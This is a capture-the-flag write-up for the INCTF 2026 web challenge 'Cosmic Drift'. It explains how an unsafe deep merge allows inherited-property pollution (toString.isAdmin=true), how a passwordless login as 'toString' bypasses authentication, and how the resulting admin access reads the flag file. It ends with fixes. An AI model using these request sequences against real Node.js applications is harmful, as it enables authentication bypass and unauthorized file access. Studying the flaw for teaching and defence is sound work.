---
title: Cosmic Drift
ctf: INCTF 2026
date: 2026-06-20
tags:
  - Web Exploitation
summary: Exploited an unsafe object merge to pollute inherited JavaScript properties, authenticated as an inherited object, escalated privileges to admin, and abused the administrative file reader to retrieve the flag.
---

# Cosmic Drift - Writeup

| Field        | Value            |
| ------------ | ---------------- |
| **CTF**      | INCTF 2026       |
| **Category** | Web Exploitation |

---

## Challenge Description

> Truly Spacious !!

## Challenge Overview

The application is a Node.js/Express web application with:

- User registration and login
- Session-based authentication
- A cargo manifest editor (`/product`)
- An admin panel (`/admin`)
- A file reader available only to admins

The goal is to gain admin privileges and read `flag.txt`.

---

# Source Analysis

## User Storage

Users are stored in a plain JavaScript object:

```js
const users = {};
```

New users are created as:

```js
users[username] = {
    password: password,
    isAdmin: false,
    ProductConfig: {...}
};
```

Every normal user starts with:

```js
isAdmin: false;
```

---

## Admin Check

```js
const isAdminUser = (req) => {
  const user = users[req.session.userId];
  return !!user?.isAdmin;
};
```

If `user.isAdmin` becomes truthy, access to `/admin` is granted.

---

# Vulnerable Function

The critical vulnerability is inside `/product`.

```js
app.get("/product", isAuthenticated, (req, res) => {
  const parsedUpdates = parseQueryParams(queryString);

  if (Object.keys(parsedUpdates).length > 0) {
    user.ProductConfig = deepMerge(user.ProductConfig, parsedUpdates);
  }
});
```

The dangerous merge routine:

```js
const deepMerge = (target, source) => {
  for (const key in source) {
    if (source[key] instanceof Object && key in target) {
      Object.assign(source[key], deepMerge(target[key], source[key]));
    }
  }

  Object.assign(target || {}, source);
  return target;
};
```

The bug is:

```js
key in target;
```

instead of

```js
target.hasOwnProperty(key);
```

which allows inherited properties to participate in merging.

---

# Why Prototype Pollution Works

The parser blocks direct use of:

```js
__proto__;
prototype;
constructor;
```

by renaming them.

However, it does not block:

```js
toString;
valueOf;
```

and other inherited properties.

Because:

```js
toString in target;
```

returns:

```js
true;
```

for every object.

Therefore a request such as:

```http
GET /product?toString.isAdmin=true
```

creates:

```js
{
  toString: {
    isAdmin: "true";
  }
}
```

which is merged into an inherited property chain.

This causes:

```js
users.toString.isAdmin = "true";
```

---

# Login Bug

The login handler:

```js
const user = users[username];

if (user && user.password === password) {
  req.session.userId = username;
  res.redirect("/");
}
```

When we use:

```http
POST /login

username=toString
```

the lookup becomes:

```js
users["toString"];
```

which does not refer to a real user.

Instead it resolves to the inherited function:

```js
Object.prototype.toString;
```

(or a polluted version of it).

Because no password field is supplied:

```js
password === undefined;
```

and:

```js
user.password;
```

is also undefined.

Therefore:

```js
undefined === undefined;
```

evaluates to:

```js
true;
```

and login succeeds.

The application stores:

```js
req.session.userId = "toString";
```

---

# Becoming Admin

After pollution:

```js
users.toString.isAdmin = true;
```

The admin check becomes:

```js
const user = users["toString"];

return !!user.isAdmin;
```

which evaluates to:

```js
true;
```

because the inherited object now has:

```js
isAdmin = true;
```

Access to `/admin` is granted.

---

# Reading the Flag

The admin panel exposes:

```js
/admin/files
```

which reads files from:

```js
data / contents;
```

The startup code writes the flag to:

```js
data / contents / flag.txt;
```

Therefore:

```http
GET /admin/files?file=flag.txt
```

returns the flag.

---

# Exploitation Steps

## Step 1 – Register

Create a normal account:

```http
POST /register

username=test
password=test
```

---

## Step 2 – Pollute

While logged in:

```http
GET /product?toString.isAdmin=true
```

---

## Step 3 – Login as toString

Send a login request without a password field:

```http
POST /login
Content-Type: application/x-www-form-urlencoded

username=toString
```

Do NOT include:

```http
password=
```

and do NOT register a user named `toString`.

---

## Step 4 – Access Admin

Browse:

```http
GET /admin
```

You should now see the Command Deck.

---

## Step 5 – Read the Flag

Request:

```http
GET /admin/files?file=flag.txt
```

`inctf{REDACTED}`

---

# Root Cause

The challenge combines three vulnerabilities:

1. Unsafe deep merge using inherited properties

```js
key in target;
```

2. Login against inherited object properties

```js
users[username];
```

3. Admin authorization based solely on a mutable property

```js
user.isAdmin;
```

Together they allow authentication and privilege escalation through prototype/inheritance abuse.

## Fixes

Use:

```js
Object.prototype.hasOwnProperty.call(target, key);
```

instead of:

```js
key in target;
```

Store users in:

```js
Object.create(null);
```

- Validate usernames strictly.
- Reject inherited properties.
- Never trust object prototype chains during authentication or authorization.
- Prefer Object.create(null) for user-controlled dictionaries.
- Validate usernames against inherited property names.
- Use hasOwnProperty() when handling security-sensitive objects.

PWN by **W4RR1OR**
